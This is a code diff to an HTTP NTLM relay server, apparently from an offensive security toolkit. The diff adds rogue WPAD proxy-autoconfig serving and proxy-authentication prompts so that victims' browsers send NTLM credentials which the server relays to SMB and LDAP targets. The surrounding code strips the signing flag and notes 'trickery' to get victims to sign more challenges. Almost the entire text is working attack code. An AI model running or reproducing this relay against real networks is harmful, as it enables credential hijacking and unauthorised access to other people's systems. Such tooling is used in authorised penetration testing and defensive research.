@@ -12,10 +12,11 @@
 #  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
 #
 # Description:
-#             This is the HTTP server which relays the NTLMSSP 
+#             This is the HTTP server which relays the NTLMSSP
 #   messages to other protocols
 import SimpleHTTPServer
 import SocketServer
+import socket
 import base64
 import logging
 import random
@@ -36,6 +37,11 @@ class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
+            self.daemon_threads = True
+            if self.config.ipv6:
+                self.address_family = socket.AF_INET6
+            # Tracks the number of times authentication was prompted for WPAD per client
+            self.wpad_counters = {}
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
     class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
@@ -49,6 +55,7 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             self.authUser = None
+            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; return "PROXY %s:80; DIRECT";} '
             if self.server.config.mode != 'REDIRECT':
                 if self.server.config.target is None:
                     # Reflection mode, defaults to SMB at the target, for now
@@ -76,20 +83,46 @@ class HTTPRelayServer(Thread):
                 return self.do_GET()
             return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)
 
+        def serve_wpad(self):
+            self.wpad = self.wpad % (self.server.config.wpad_host, self.server.config.wpad_host)
+            self.send_response(200)
+            self.send_header('Content-type', 'application/x-ns-proxy-autoconfig')
+            self.send_header('Content-Length',len(self.wpad))
+            self.end_headers()
+            self.wfile.write(self.wpad)
+            return
+
+        def should_serve_wpad(self, client):
+            # If the client was already prompted for authentication, see how many times this happened
+            try:
+                num = self.server.wpad_counters[client]
+            except KeyError:
+                num = 0
+            self.server.wpad_counters[client] = num + 1
+            # Serve WPAD if we passed the authentication offer threshold
+            if num >= self.server.config.wpad_auth_num:
+                return True
+            else:
+                return False
+
         def do_HEAD(self):
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-        def do_AUTHHEAD(self, message = ''):
-            self.send_response(401)
-            self.send_header('WWW-Authenticate', message)
+        def do_AUTHHEAD(self, message = '', proxy=False):
+            if proxy:
+                self.send_response(407)
+                self.send_header('Proxy-Authenticate', message)
+            else:
+                self.send_response(401)
+                self.send_header('WWW-Authenticate', message)
             self.send_header('Content-type', 'text/html')
             self.send_header('Content-Length','0')
             self.end_headers()
 
         #Trickery to get the victim to sign more challenges
-        def do_REDIRECT(self):
+        def do_REDIRECT(self, proxy=False):
             rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
             self.send_response(302)
             self.send_header('WWW-Authenticate', 'NTLM')
@@ -107,26 +140,55 @@ class HTTPRelayServer(Thread):
             self.send_header('Connection','close')
             self.end_headers()
 
+        def do_POST(self):
+            return self.do_GET()
+
+        def do_CONNECT(self):
+            return self.do_GET()
+
+        def do_HEAD(self):
+            return self.do_GET()
+
         def do_GET(self):
             messageType = 0
             if self.server.config.mode == 'REDIRECT':
                 self.do_SMBREDIRECT()
                 return
 
-            if self.headers.getheader('Authorization') is None:
-                self.do_AUTHHEAD(message = 'NTLM')
+            logging.info('HTTPD: Client requested path: %s' % self.path.lower())
+
+            # Serve WPAD if:
+            # - The client requests it
+            # - A WPAD host was provided in the command line options
+            # - The client has not exceeded the wpad_auth_num threshold yet
+            if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
+                logging.info('HTTPD: Serving PAC file to client %s' % self.client_address[0])
+                self.serve_wpad()
+                return
+
+            # Determine if the user is connecting to our server directly or attempts to use it as a proxy
+            if self.command == 'CONNECT' or (len(self.path) > 4 and self.path[:4].lower() == 'http'):
+                proxy = True
+            else:
+                proxy = False
+
+            if (proxy and self.headers.getheader('Proxy-Authorization') is None) or (not proxy and self.headers.getheader('Authorization') is None):
+                self.do_AUTHHEAD(message = 'NTLM',proxy=proxy)
                 pass
             else:
-                typeX = self.headers.getheader('Authorization')
+                if proxy:
+                    typeX = self.headers.getheader('Proxy-Authorization')
+                else:
+                    typeX = self.headers.getheader('Authorization')
                 try:
                     _, blob = typeX.split('NTLM')
                     token = base64.b64decode(blob.strip())
                 except:
-                    self.do_AUTHHEAD()
+                    self.do_AUTHHEAD(message = 'NTLM', proxy=proxy)
                 messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
 
             if messageType == 1:
-                if not self.do_ntlm_negotiate(token):
+                if not self.do_ntlm_negotiate(token, proxy=proxy):
                     #Connection failed
                     self.server.config.target.log_target(self.client_address[0],self.target)
                     self.do_REDIRECT()
@@ -144,7 +206,7 @@ class HTTPRelayServer(Thread):
                         self.do_REDIRECT()
                     else:
                         #If it was an anonymous login, send 401
-                        self.do_AUTHHEAD('NTLM')
+                        self.do_AUTHHEAD('NTLM', proxy=proxy)
                 else:
                     # Relay worked, do whatever we want here...
                     logging.info("Authenticating against %s as %s\%s SUCCEED" % (
@@ -166,9 +228,9 @@ class HTTPRelayServer(Thread):
                     self.send_header('Content-Length','0')
                     self.send_header('Connection','close')
                     self.end_headers()
-            return 
+            return
 
-        def do_ntlm_negotiate(self,token):
+        def do_ntlm_negotiate(self,token, proxy):
             if self.target[0] == 'SMB':
                 try:
                     self.client = SMBRelayClient(self.target[1], extended_security = True)
@@ -178,7 +240,7 @@ class HTTPRelayServer(Thread):
                     negotiate.fromString(token)
                     #Remove the signing flag
                     negotiate['flags'] ^= ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-                    clientChallengeMessage = self.client.sendNegotiate(negotiate.getData()) 
+                    clientChallengeMessage = self.client.sendNegotiate(negotiate.getData())
                 except Exception, e:
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
@@ -194,7 +256,7 @@ class HTTPRelayServer(Thread):
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
                     return False
-            
+
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 try:
                     self.client = LDAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
@@ -230,13 +292,13 @@ class HTTPRelayServer(Thread):
             #Calculate auth
             self.challengeMessage = ntlm.NTLMAuthChallenge()
             self.challengeMessage.fromString(clientChallengeMessage)
-            self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
+            self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
             return True
-        
+
         def do_ntlm_auth(self,token,authenticateMessage):
             #For some attacks it is important to know the authenticated username, so we store it
             self.authUser = authenticateMessage['user_name']
-            
+
             #TODO: What is this 127.0.0.1 doing here? Maybe document specific use case
             if authenticateMessage['user_name'] != '' or self.target[1] == '127.0.0.1':
                 respToken2 = SPNEGO_NegTokenResp()
